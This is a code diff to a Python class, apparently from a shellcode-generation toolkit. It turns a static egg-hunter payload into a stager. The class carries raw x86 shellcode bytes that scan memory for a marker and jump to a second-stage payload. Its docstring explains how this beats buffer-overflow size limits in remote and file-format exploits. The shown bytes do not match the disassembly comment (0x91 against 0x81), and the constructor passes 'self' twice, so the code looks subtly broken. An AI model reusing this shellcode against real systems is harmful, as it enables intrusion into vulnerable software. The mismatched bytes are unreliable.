@@ -28,10 +28,23 @@
 
 __all__ = ["Hunter"]
 
-from shellgen import Static
+from shellgen import Stager
 
-class Hunter (Static):
-    "Egg Hunter."
+class Hunter (Stager):
+    """
+    Egg Hunter.
+
+    Egg Hunters look for the next stage shellcode in memory and jump to it.
+    This is useful for getting around size limitations in buffer overflows,
+    you send this stage as payload and the real payload (the next stage)
+    anywhere else in memory, for example by sending an incomplete request to
+    be processed by another thread of the target service in a remote exploit,
+    or placing it somewhere within the exploit file in a client-side exploit
+    for a file format bug.
+
+    For more information see:
+    [PDF] U{http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf}
+    """
 
     # 00000000 6681CAFF0F or dx,0xfff
     # 00000005 42         inc edx
@@ -54,7 +67,12 @@ class Hunter (Static):
     qualities = "stack_balanced"
     encoding  = "nullfree"
 
-    bytes = (
-        "\x66\x91\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF"
-        "\xB8\x90\x50\x90\x50\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
-    )
+    def __init__(self, next_stage):
+        next_stage = "\x90\x50\x90\x50\x90\x50\x90\x50" + next_stage
+        super(Hunter, self).__init__(self, next_stage)
+
+    def compile(self, state):
+        return (
+            "\x66\x91\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74"
+            "\xEF\xB8\x90\x50\x90\x50\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+        )
